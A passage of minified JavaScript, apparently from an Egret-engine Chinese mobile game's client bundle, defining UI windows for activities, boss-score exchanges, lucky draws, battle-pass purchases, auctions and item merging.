T=egret.Tween.get(this);this.eG.visible=!1,T.wait(y).call(function(){t.canClose=!0,t.eG.visible=!0,t.playAnimaiton()})},e.prototype.removeDisplay=function(){egret.Tween.removeTweens(this),egret.Tween.removeTweens(this.eG),egret.Tween.removeTweens(this.imgAct),this.closeFunc&&this.closeFunc.apply(null),this.closeFunc=null,o.DisplayUtils.removeFromParent(this.imgEff),o.DisplayUtils.removeFromParent(this.mc),o.DisplayUtils.removeFromParent(this.bgMc),o.DisplayUtils.removeFromParent(this.titleMc),o.DisplayUtils.removeFromParent(this.proMc),o.DisplayUtils.removeFromParent(this.petMc),this.imgEff=null,this.mc=null},e.prototype.playAnimaiton=function(){var t=this;this.bgMc.playFile(RES_DIR_EFF+"activation_base1",1),this.eG.scaleX=this.eG.scaleY=.25;var e=1,i=egret.Tween.get(this);i.call(function(){var i=egret.Tween.get(t.eG);i.to({scaleX:1.6,scaleY:1.6},100*e).to({scaleX:1,scaleY:1},100*e).call(function(){t.titleMc.playFile(RES_DIR_EFF+("activation_"+t.titleStr+"1"),1),t.artifactTween()})}).wait(1900).call(function(){o.DisplayUtils.removeFromParent(t.bgMc),t.bg.addChild(t.bgMc),t.bgMc.playFile(RES_DIR_EFF+"activation_base2",-1)}).wait(200).call(function(){o.DisplayUtils.removeFromParent(t.titleMc),t.title.addChild(t.titleMc),t.titleMc.playFile(RES_DIR_EFF+("activation_"+t.titleStr+"2"),-1)})},e.prototype.artifactTween=function(){var t=egret.Tween.get(this.imgAct,{loop:!0});t.to({y:this.imgAct.y-20},1e3).to({y:this.imgAct.y},1e3)},e.show=function(t,e,i,n,o,s,a,r){void 0===n&&(n=null),void 0===s&&(s=0)},e}(a.BaseView);e.Activationtongyong=l,window.Activationtongyong=l,__reflect(l.prototype,"Activationtongyong",[]),window.Activationtongyong=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RingBossScoreExchangeItem=e.BossScoreExchangeItem=e.BossScoreExchangeBtn=e.BossScoreExchangeWin=void 0;var n=i(5),o=i(3),s=i(1),a=i(0),r=i(6),l=i(2),h=i(9),u=i(243),p=i(30),d=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.currentSelect=0,e._sn_="hefuBossjifenSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.equiplist.itemRenderer=c,this.dataArr=new eui.ArrayCollection,this.exchangelist.dataProvider=this.dataArr,this.listData={},this.menuData=[]},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.activityID=t[0],this.initMenu();var i=a.GlobalConfig.ActivityType7Config[this.activityID][1];this.equiplist.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onTap,this),this.exchangelist.itemRenderer=f,this.observe(h.Activity.ins().postRewardResult,this.onListChange),this.observe(h.Activity.ins().postChangePage,this.ChangePageCallBack),this.addTouchEvent(this.bgClose,this.onClick),this.addTouchEvent(this.closeBtn,this.onClick),i&&i.showType!=u.ActivityType7Data.TYPE_RING&&(this.equiplist.selectedIndex=this.currentSelect),this.refushInfo()},e.prototype.onClick=function(t){switch(t.currentTarget){case this.closeBtn:case this.bgClose:win.close(this)}},e.prototype.onListChange=function(){h.Activity.ins().sendChangePage(this.activityID)},e.prototype.ChangePageCallBack=function(){this.refushInfo()},e.prototype.initMenu=function(){var t=a.GlobalConfig.ActivityType7Config[this.activityID],e=-1,i=0;for(var n in t)i!=t[n].title&&(i=t[n].title,e++,this.menuData||(this.menuData=[]),this.menuData.push({id:t[n].Id,index:t[n].index})),this.listData[e]||(this.listData[e]=[]),this.listData[e].push(t[n])},e.prototype.refushInfo=function(){var t=h.Activity.ins().getActivityDataById(this.activityID);this.suipian.text=""+t.bossScore,this.dataArr.replaceAll(this.listData[this.currentSelect].concat()),this.exchangelist.validateNow();var e=a.GlobalConfig.ActivityType7Config[this.activityID][1];e&&e.showType!=u.ActivityType7Data.TYPE_RING&&(this.equiplist.dataProvider=new eui.ArrayCollection(this.menuData))},e.prototype.onTap=function(t){t&&t.itemRenderer&&t.item&&(this.currentSelect=t.itemIndex,this.refushInfo(),this.exchangelist.scrollV=0)},e}(s.BaseView);e.BossScoreExchangeWin=d,window.BossScoreExchangeWin=d,__reflect(d.prototype,"BossScoreExchangeWin",[]);var c=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.childrenCreated=function(){t.prototype.childrenCreated.call(this)},e.prototype.dataChanged=function(){var t=this.data.id,e=this.data.index,i=a.GlobalConfig.ActivityType7Config[t][e];this.btnText.text=gettext("{0}转",i.title),this.redPoint.visible=h.Activity.ins().IsBossScoreTitle(i.Id,i.title)},e.prototype.destruct=function(){},e}(o.BaseItemRender);e.BossScoreExchangeBtn=c,window.BossScoreExchangeBtn=c,__reflect(c.prototype,"BossScoreExchangeBtn",[]);var f=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.childrenCreated=function(){t.prototype.childrenCreated.call(this),this.goBtn.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this)},e.prototype.onClick=function(){if(r.BagCT.ins().getAllSurplusCount(1)<0)return void l.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容"));var t=this.data,e=h.Activity.ins().getActivityDataById(t.Id);return e.bossScore<t.score?void l.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:积分不足|")):h.Activity.ins().getIsBuy(t)?void h.Activity.ins().sendReward(t.Id,t.index):void l.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:已经兑换完|"))},e.prototype.dataChanged=function(){var t=this.data,e=a.GlobalConfig.ItemConfig[t.rewards[0].id],i=h.Activity.ins().getActivityDataById(t.Id),o=i.bossScore,s=h.Activity.ins().getIsBuy(t);this.redPoint.visible=s&&o>=t.score,0==t.rewards[0].type?this.nameLab.text=p.RewardData.getCurrencyName(t.rewards[0].id):this.nameLab.text=e.name;var r=o<t.score?"#F3311E":"#35E62D";if(this.descLab.textFlow=(new egret.HtmlTextParser).parser("<font color = '"+r+"'>"+t.score+"</font>"),this.goBtn.currentState="up",this.goBtn.touchEnabled=!0,t.count){this.count.visible=!0;var l=t.count-i.personalRewardsSum[t.index];l=l>0?l:0,l||(this.goBtn.currentState="disabled",this.goBtn.touchEnabled=!1);var u=0>l?15937822:3532333;this.count.textFlow=n.TextFlowMaker.generateTextFlow1(gettext("|C:0x9F946D&T:剩余|C:{0}&T:{1}|C:0x9F946D&T:份",u,l))}else this.count.visible=!1;this.itemConfig=e,this.itemIcon0.data=t.rewards[0]},e}(o.BaseItemRender);e.BossScoreExchangeItem=f,window.BossScoreExchangeItem=f,__reflect(f.prototype,"BossScoreExchangeItem",[]);var g=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.childrenCreated=function(){t.prototype.childrenCreated.call(this),this.goBtn.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this)},e.prototype.dataChanged=function(){var t=this.data,e=a.GlobalConfig.ItemConfig[t.rewards[0].id],i=h.Activity.ins().getActivityDataById(t.Id),n=i.bossScore,o=h.Activity.ins().getIsBuy(t);this.redPoint.visible=o&&n>=t.score,this.nameLab.text=e.name;var s=n<t.score?"#F3311E":"#35E62D";this.descLab.textFlow=(new egret.HtmlTextParser).parser("<font color = '"+s+"'>"+n+"</font><font color = '#9F946D'>/"+t.score+"</font>"),this.itemConfig=e,this.itemIcon0.data=t.rewards[0];var r=h.Activity.ins().getActivityDataById(t.Id),l=r.personalRewardsSum[t.index],u=t.count-l;u?this.count.text=gettext("剩余{0}份",u):this.count.text=""},e.prototype.onClick=function(){var t=this.data,e=h.Activity.ins().getActivityDataById(t.Id);return e.bossScore<t.score?void l.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:积分不足|")):h.Activity.ins().getIsBuy(t)?void h.Activity.ins().sendReward(t.Id,t.index):void l.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:已经兑换完|"))},e}(o.BaseItemRender);e.RingBossScoreExchangeItem=g,window.RingBossScoreExchangeItem=g,__reflect(g.prototype,"RingBossScoreExchangeItem",[]),window.RingBossScoreExchangeItem=g,window.BossScoreExchangeItem=f,window.BossScoreExchangeBtn=c,window.BossScoreExchangeWin=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ComActivityWin=void 0;var n=i(1),o=i(61),s=i(9),a=i(25),r=i(6),l=i(69),h=i(29),u=i(55),p=i(4),d=function(t){function e(){var e=t.call(this)||this;return e.activityPanelList=[],e.selectIndex=0,e._sn_="",e}return __extends(e,t),e.openCheck=function(){return!o.LocationProperty.isIosTS},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];if(this.curPageSytle=t[0],this.addTouchEvent(this,this.onTouch),this.updateView(),observe(this,this.refushRedPoint,s.Activity.ins().postActivityIsGetAwards),observe(this,this.refushRedPoint,a.Recharge.ins().postUpdateRechargeEx),observe(this,this.refushRedPoint,a.Recharge.ins().postUpdateRecharge),observe(this,this.refushRedPoint,a.Recharge.ins().postRechargeTotalDay),observe(this,this.refushRedPoint,r.BagCT.ins().postItemAdd),observe(this,this.refushRedPoint,r.BagCT.ins().postItemChange),observe(this,this.refushRedPoint,r.BagCT.ins().postItemDel),observe(this,this.refushRedPoint,p.ActorCC.postLevelChange),this.eList&&(this.addChangeEvent(this.eList,this.onClickMenu),this.addEvent(eui.UIEvent.CHANGE_END,this.eScroller,this.onChange)),this.selectIndex=0,t&&t.length){var i=t[0],n=0;for(var o in this._datas){if(this._datas[o].id==i){this.selectIndex=n;break}n++}}l.SoundUtil.play(l.SoundEnum.WINDOW),this.eList&&(this.eList.selectedIndex=this.selectIndex),this.eVs.selectedIndex=this.selectIndex,s.Activity.ins().setPalyEffListById(this.activityPanelList[this.selectIndex].activityID,!0),this.onChange()},e.prototype.updateView=function(){this.eVs.removeChildren(),this.activityPanelList=[],this._datas=[];var t=s.Activity.ins().activityData;for(var e in t){var i=t[e];if(i.pageStyle==this.curPageSytle&&i.isOpenActivity()&&!i.getHide()){var n=s.Activity.ins().getbtnInfo(e);n?this._datas.push(n):this._datas.push({id:i.id,type:n.type})}}this._datas.sort(this.sort);var o=0;for(var e in this._datas){var a=this._datas[e].id,r=h.ActivityPanel.create(a,this._datas[e].type);r&&(this.activityPanelList[o]=r,r.visible=!1,this.eVs.addChild(this.activityPanelList[o]),o++)}this.dataArr=new eui.ArrayCollection(this._datas),this.eList&&(this.eList.dataProvider=this.dataArr),this.eTitle.source="activity_t"+this.curPageSytle},e.prototype.sort=function(t,e){return u.Algorithm.sortAsc(t.sort,e.sort)},e.prototype.onTouch=function(t){var e=this.eList&&this.eList.numElements>0?this.eList.contentHeight/this.eList.numElements:0;switch(t.target){case this.eRBtn:this.eList.scrollV+e>this.eList.contentHeight-this.eScroller.height?this.eList.scrollV=this.eList.contentHeight-this.eScroller.height:this.eList.scrollV+=e,this.onChange();break;case this.eCloseBtn:win.close(this)}},e.prototype.onChange=function(){if(this.skin&&this.eList){var t=this.eList.numElements>0?this.eList.contentHeight/this.eList.numElements:0;if(this.eList.contentHeight<this.eScroller.height?this.eRBtn.visible=!1:this.eList.scrollV+t/2>this.eList.contentHeight-this.eScroller.height?this.eRBtn.visible=!1:this.eRBtn.visible=!0,this.eRBtn.visible)for(var e=Math.floor(this.eList.scrollV/t)+Math.floor(this.eScroller.height/t),i=this.eList.dataProvider.length,n=e+1;i>n;n++)if(s.Activity.ins().getActivityDataById(this._datas[n].id).canReward()){this.eRBtn.sRp=!0;break}}},e.prototype.onClickMenu=function(t){this.selectIndex!=t.currentTarget.selectedIndex&&(l.SoundUtil.play(l.SoundEnum.WINDOW),this.selectIndex=t.currentTarget.selectedIndex,this.eVs.selectedIndex=this.selectIndex,this.eList.selectedIndex=this.selectIndex,s.Activity.ins().setPalyEffListById(this.activityPanelList[this.selectIndex].activityID,!0),this.refushRedPoint())},e.prototype.refushRedPoint=function(){this.dataArr.replaceAll(this._datas),this.eList&&(this.eList.dataProvider=this.dataArr)},__decorate([delayCall(100)],e.prototype,"onChange",null),e}(n.BaseView);e.ComActivityWin=d,window.ComActivityWin=d,__reflect(d.prototype,"ComActivityWin",[]),window.ComActivityWin=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LuckyResultWinEx=void 0;var n=i(18),o=i(5),s=i(1),a=i(11),r=i(0),l=i(4),h=i(6),u=i(10),p=i(2),d=i(9),c=window.cc_launchX=180;window.cc_launchX=c;var f=window.cc_launchY=500;window.cc_launchY=f;var g=window.cc_firstX=0;window.cc_firstX=g;var m=window.cc_firstY=0;window.cc_firstY=m;var v=window.cc_distantX=77;window.cc_distantX=v;var y=window.cc_distantY=93;window.cc_distantY=y;var C=window.cc_depotX=320;window.cc_depotX=C;var T=window.cc_depotY=620;window.cc_depotY=T;var b=window.cwaitTime=50;window.cwaitTime=b;var w=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="HuntResult",e.arr=[],e.items=[],e.type=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.eYuanBaoGroup.visible=!1},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.buyBtn,this.buy),this.observe(d.Activity.ins().postRewardResult,this.updateView),this.activityID=t[0],this.indexs=t[1],this.updateView()},e.prototype.close=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e]},e.prototype.updateView=function(){this.canClicck=!0,this.zwHunt.visible=!0;var t=r.GlobalConfig.ActivityType52Config,e=d.Activity.ins().activityData[this.activityID];if(this.indexs.length>1){var i=t[this.activityID];this.arr=e.itemList,this.buyBtn.labelDisplay.text=gettext("抽10次"),this.yb=10*i[0].yb,this.zw.text=this.yb+"";var n=r.GlobalConfig.ItemConfig[i[0].item];this.icon.source=u.ItemUtil.getItemSource(r.GlobalConfig.ItemConfig[n.id]),this.itemId=i[0].item,this.updateDesc(),this.playResult(),this.zwNum2.text="/10）"}else if(e.indexsEx.length){var i=t[this.activityID];this.arr=e.itemList,this.buyBtn.labelDisplay.text="抽1次",this.yb=1*i[0].yb,this.zw.text=this.yb+"";var n=r.GlobalConfig.ItemConfig[i[0].item];this.icon.source=n?n.icon+"_png":null,this.itemId=i[0].item,this.updateDesc(),this.playResult(),this.zwNum2.text="/1）"}},e.prototype.updateDesc=function(){var t=h.BagCT.ins().getBagItemById(this.itemId),e=n.ColorUtil.WHITE_COLOR,i=0,s=10;t&&(i=t.count,e=t.count>=s?n.ColorUtil.GREEN_COLOR:n.ColorUtil.RED_COLOR),this.zwNum1.textFlow=o.TextFlowMaker.generateTextFlow("<font color="+e+">"+i+"</font> ")},e.prototype.playResult=function(t){var e=this;this.releaseAllItem();for(var i=this.arr.length,n=0;i>n;n++){this.items[n]=this.createItem(this.arr[n],n);var o=egret.Tween.get(this.items[n]);this.items[n].x=n%5*v+g,this.items[n].y=Math.floor(n/5)*y+m,this.items[n].alpha=0,o.wait(n*b).to({alpha:1},200).call(function(){i--,0==i&&(void 0!=t&&t(),e.canClicck=!0)})}},e.prototype.createItem=function(t,e){var i=new a.ItemBase;this.listCon.addChild(i);var n=r.GlobalConfig.ItemConfig[t.id];return n?(i.num=t.count,i.data=t):i.data={type:0,count:t.count,id:t.id},i.x=c,i.y=f,i},e.prototype.releaseAllItem=function(){for(var t in this.items)this.items[t].destruct(),this.listCon.removeChild(this.items[t]);this.items=[]},e.prototype.buy=function(t){if(this.canClicck)if(this.ins=d.Activity.ins(),this.config52=r.GlobalConfig.ActivityType52Config,this.indexs.length>1){var e=this.config52[this.activityID][0],i=h.BagCT.ins().getBagGoodsByTypeAndId(h.BagCT.BAG_TYPE_OTHTER,e.item);i&&i.count>=10?this.ins.sendReward(this.activityID,2):p.TipsCT.ins().showTips(gettext("{0}不足",r.GlobalConfig.ItemConfig[e.item].name))}else{var e=this.config52[this.activityID][0],i=h.BagCT.ins().getBagGoodsByTypeAndId(h.BagCT.BAG_TYPE_OTHTER,e.item);i&&i.count?(this.ins.sendReward(this.activityID,1,1),this.ins.sendReward(this.activityID,1,2)):p.TipsCT.ins().showTips(gettext("{0}不足",r.GlobalConfig.ItemConfig[e.item].name))}},e.prototype.huntWarnFun=function(){var t=this.config52[this.activityID][0],e=h.BagCT.ins().getBagGoodsByTypeAndId(h.BagCT.BAG_TYPE_OTHTER,t.item);this.indexs.length>1?(e&&e.count&&this.ins.sendReward(this.activityID,2),l.ActorCC.yb>=10*t.yb?this.ins.sendReward(this.activityID,2):p.TipsCT.ins().showTips("|C:0xf3311e&T:元宝不足|")):e&&e.count?(this.ins.sendReward(this.activityID,1,1),this.ins.sendReward(this.activityID,1,2)):l.ActorCC.yb>=1*t.yb?(this.ins.sendReward(this.activityID,1,1),this.ins.sendReward(this.activityID,1,2)):p.TipsCT.ins().showTips("|C:0xf3311e&T:元宝不足|")},e}(s.BaseView);e.LuckyResultWinEx=w,window.LuckyResultWinEx=w,__reflect(w.prototype,"LuckyResultWinEx",[]),window.LuckyResultWinEx=w},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSA41_3TipPanel=void 0;var n=i(66),o=i(1),s=i(0),a=i(25),r=i(2),l=i(9),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa41p3Tips",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEndEvent(this.btnLuxury,this.onClick),this.addTouchEndEvent(this.btnZero,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.btnChange,l.Activity.ins().postRewardResult);var i=s.GlobalConfig.ActivityType41Config[7101],o=a.Recharge.ins().getCashByRid(i.rid)/100;this.btnLuxury.label=n.PayUtils.getPayUnitStr(o,urlParam.payUnit),this.btnChange()},e.prototype.btnChange=function(){var t=l.Activity.ins().activityData[7101];t&&(this.isGetLuxury.visible=t.hasBuy,this.btnLuxury.visible=!this.isGetLuxury.visible)},e.prototype.onClick=function(t){var e=l.Activity.ins().activityData[7101];if(!e)return void r.TipsCT.ins().showTips(gettext("活动未开启"));var i=s.GlobalConfig.ActivityType41Config[7101];switch(t.currentTarget){case this.btnLuxury:e.hasBuy?r.TipsCT.ins().showTips(gettext("已购买黄金悬赏")):a.Recharge.ins().sendPayOrder(i.rid);break;case this.btnZero:}win.close(this)},e}(o.BaseView);e.OSA41_3TipPanel=h,window.OSA41_3TipPanel=h,__reflect(h.prototype,"OSA41_3TipPanel",[]),window.OSA41_3TipPanel=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget58RankWin=void 0;var n=i(9),o=i(1),s=i(356),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ActivityFbRankSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=s.OSATarget58RankItemRender},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.actId=t[0],observe(this,this.updateRank,n.Activity.ins().postRewardResult),this.updateRank(),n.Activity.ins().sendReward(this.actId,2)},e.prototype.updateRank=function(){var t=n.Activity.ins().activityData[this.actId];t?this.eList.dataProvider=new eui.ArrayCollection(t.ranks):this.eList.dataProvider=null,this.eTips.visible=!t||0==t.ranks.length},e}(o.BaseView);e.OSATarget58RankWin=a,window.OSATarget58RankWin=a,__reflect(a.prototype,"OSATarget58RankWin",[]),window.OSATarget58RankWin=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSAZhanlingTipPanel=void 0;var n=i(19),o=i(66),s=i(5),a=i(1),r=i(0),l=i(36),h=i(25),u=i(2),p=i(9),d=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="OSAZhanlingTipSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEndEvent(this.btnLuxury,this.onClick),this.addTouchEndEvent(this.btnZero,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.btnChange,p.Activity.ins().postRewardResult);var i=r.GlobalConfig.ActivityType41Config[27],n=h.Recharge.ins().getCashByRid(i.rid)/100;this.btnLuxury.label=o.PayUtils.getPayUnitStr(n,urlParam.payUnit),this.btnZero.label=gettext("{0}元宝",i.yuanbaoCost),this.descZero.textFlow=s.TextFlowMaker.generateTextFlow(i.desc),this.descLuxury.textFlow=s.TextFlowMaker.generateTextFlow(i.desc2),this.btnChange()},e.prototype.btnChange=function(){var t=p.Activity.ins().activityData[27];t&&(this.isGetZero.visible=null===t||void 0===t?void 0:t.ybhasBuy,this.btnZero.visible=!this.isGetZero.visible,this.isGetLuxury.visible=null===t||void 0===t?void 0:t.hasBuy,this.btnLuxury.visible=!this.isGetLuxury.visible)},e.prototype.onClick=function(t){var e=p.Activity.ins().activityData[27];if(!e)return void u.TipsCT.ins().showTips(gettext("活动未开启"));var i=r.GlobalConfig.ActivityType41Config[27];switch(t.currentTarget){case this.btnLuxury:e.hasBuy?u.TipsCT.ins().showTips(gettext("已购买豪华战令")):h.Recharge.ins().sendPayOrder(i.rid);break;case this.btnZero:n.GlobalFun.checkCost(i.yuanbaoCost,l.MoneyConst.yuanbao)&&p.Activity.ins().sendYb41(27)}win.close(this)},e}(a.BaseView);e.OSAZhanlingTipPanel=d,window.OSAZhanlingTipPanel=d,__reflect(d.prototype,"OSAZhanlingTipPanel",[]),window.OSAZhanlingTipPanel=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.osa19p1rewardItemRender=e.osa19p1rewardPanel=void 0;var n=i(3),o=i(1),s=i(11),a=i(0),r=i(9),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa19p1rewardskin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.listArray=new eui.ArrayCollection,this.listView.itemRenderer=h,this.listView.dataProvider=this.listArray},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.activityID=t[0],this.update()},e.prototype.update=function(){var t=r.Activity.ins().activityData[this.activityID];if(t){var e=a.GlobalConfig.ActivityType19Config[this.activityID],i=[];for(var n in e){var o="";o=e[n].range[0]==e[n].range[1]?""+e[n].range[0]:e[n].range[0]+"-"+e[n].range[1];var s=e[n].condition?gettext("（寻宝≥{0}次即可参与本排行）",e[n].condition):"",l=e[n].rewards,h={rank:o,desc:s,rewards:l};i.push(h)}this.listArray.replaceAll(i);var u=this.listView.parent;
u.stopAnimation(),this.listView.scrollV=0}},e}(o.BaseView);e.osa19p1rewardPanel=l,window.osa19p1rewardPanel=l,__reflect(l.prototype,"osa19p1rewardPanel",[]);var h=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.awardslist.itemRenderer=s.ItemBase},e.prototype.dataChanged=function(){if(this.data){var t=this.data;this.rankTxt.text=t.rank+"",this.target.text=t.desc,this.awardslist.dataProvider=new eui.ArrayCollection(t.rewards)}},e}(n.BaseItemRender);e.osa19p1rewardItemRender=h,window.osa19p1rewardItemRender=h,__reflect(h.prototype,"osa19p1rewardItemRender",[]),window.osa19p1rewardPanel=l},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.AuctionItemChoiceWin=void 0;var n=i(1),o=i(0),s=i(130),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="auctionItemChoiceSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.itemID=t[0],this.auID=t[1],this.addTouchEndEvent(this,this.onTouch),this.update()},e.prototype.update=function(){var t=o.GlobalConfig.AuctionItem[this.auID];this.item.data=t.item,this.price1.text=t.bid+"",this.price2.text=t.buy+""},e.prototype.onTouch=function(t){switch(t.target){case this.bgClose:win.close(this);break;case this.ownUse:case this.auctionBtn:s.Auction.ins().sendUseAuBox(t.target==this.ownUse?0:1,this.itemID),win.close(this)}},e}(n.BaseView);e.AuctionItemChoiceWin=a,window.AuctionItemChoiceWin=a,__reflect(a.prototype,"AuctionItemChoiceWin",[]),window.AuctionItemChoiceWin=a},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.AuctionRecordWin=void 0;var n=i(1),o=i(357),s=i(130),a=i(5),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="auctionRecordSkin",e.type=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=o.AuctionRecordItemRender,this.list.dataProvider=this.collect=new eui.ArrayCollection([])},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.type=t[0],observe(this,this.update,s.Auction.ins().postRecord);var i=this.type?gettext("全服"):gettext("公会");this.curAuction.textFlow=a.TextFlowMaker.generateTextFlow(gettext("拍卖纪录({0})",i)),this["null"].visible=!0,s.Auction.ins().sendRecord(this.type),this.addTouchEndEvent(this,this.onTouch)},e.prototype.onTouch=function(t){t.target==this.bgClose&&win.close(this)},e.prototype.update=function(t){t.type==this.type&&(this.collect.source=t.list||[],this["null"].visible=!this.collect.source||this.collect.source.length<=0)},e}(n.BaseView);e.AuctionRecordWin=r,window.AuctionRecordWin=r,__reflect(r.prototype,"AuctionRecordWin",[]),window.AuctionRecordWin=r},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ItemCbTip=void 0;var n=i(5),o=i(1),s=i(0),a=i(36),r=i(27),l=i(6),h=i(10),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ItemCbTipSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.numLabel.restrict="0-9"},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this._data=t[0],this.currentState=t[1]||"1",this.costCm1.visible=!1,this.costCm0.visible=!1,this.addTouchEndEvent(this.BG,this.onClose),this.addTouchEndEvent(this.minBtn,this.onTap),this.addTouchEndEvent(this.maxBtn,this.onTap),this.addTouchEndEvent(this.sub1Btn,this.onTap),this.addTouchEndEvent(this.add1Btn,this.onTap),this.addTouchEndEvent(this.useBtn,this.onTap),this.addChangeEvent(this.numLabel,this.onTxtChange),this.updateBaseInfo(this._data),this.updateUse(),this.updateCost()},e.prototype.updateBaseInfo=function(t){var e=this._data;t.count=t.count?t.count:1;var i=t.count+"",o=e.itemConfig;this.nameLabel.text=o.name,this.nameLabel.textColor=h.ItemUtil.getQualityColor(h.ItemUtil.getQuality2(o)),this.itemIcon.setData(o),this.lv.text=gettext("{0}级",o.level||1),this.num.text=i,this.description.textFlow=n.TextFlowMaker.generateTextFlow(o.desc)},e.prototype.onTxtChange=function(t){var e=Number(this.numLabel.text);e>this.maxNum&&(e=this.maxNum),this.useNum=e,this.numLabel.text&&!e&&(this.numLabel.text="1"),this.useNum&&(this.numLabel.text=this.useNum+""),this.updateCost()},e.prototype.updateCost=function(){this.useNum||(this.useNum=1);var t=this._data.showCost;if(t)for(var e=0;e<t.length;e++)this["costCm"+e].visible=!0,this["costCm"+e].setData({type:0,id:t[e].id,count:this.useNum*t[e].count},!1,!1);else{var i=s.GlobalConfig.RongLuConfig[this._data.configID];i&&(this.costCm0.visible=!0,this.costCm0.setData({type:0,id:i.reward[0].id,count:this.useNum*i.reward[0].count},!1,!1))}},e.prototype.updateUse=function(){var t=this._data;this.useNum=1,this.numLabel.text="1",this.maxNum=t.count},e.prototype.onTap=function(t){var e=this;switch(this.useNum||(this.useNum=1,this.numLabel.text=this.useNum+""),t.target){case this.minBtn:this.useNum=1;break;case this.maxBtn:this.useNum=this.maxNum;break;case this.sub1Btn:this.useNum--,this.useNum<=0&&(this.useNum=1);break;case this.add1Btn:this.useNum++,this.useNum>this.maxNum&&(this.useNum=this.maxNum);break;case this.useBtn:if("1"==this.currentState){var i=l.BagCT.ins().getBagItemSById(this._data.configID);if(!i.length||!this.useNum)return;l.BagCT.ins().sendCbequip(3,i,this.useNum)}else{var n=this._data.showCost;if(n[1]&&n[1].id==a.MoneyConst.yuanbao){var o=this._data.itemConfig.name,s=h.ItemUtil.getQualityColor(h.ItemUtil.getQuality2(this._data.itemConfig));r.WarnWin.show(gettext("是否消耗{0}元宝进行合成 |C:{1}&T:{2}|",n[1].count*this.useNum,s,o),function(){l.BagCT.ins().sendMerge(e._data.mergeNum,e.useNum)},this)}else l.BagCT.ins().sendMerge(this._data.mergeNum,this.useNum)}win.close("ItemCbTip")}this.numLabel.text=this.useNum+"",this.updateCost()},e.prototype.onClose=function(t){win.close("ItemCbTip")},e}(o.BaseView);e.ItemCbTip=u,window.ItemCbTip=u,__reflect(u.prototype,"ItemCbTip",[]),window.ItemCbTip=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ItemCurrencyWin=void 0;var n=i(1),o=i(36),s=i(0),a=i(5),r=i(30),l=i(31),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ItemCurrencySkin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=t[0],n=t[1];n=n?n:0,this.addTouchEndEvent(this,this.otherClose),this.setData(i,n)},e.prototype.removeDisplay=function(){for(var 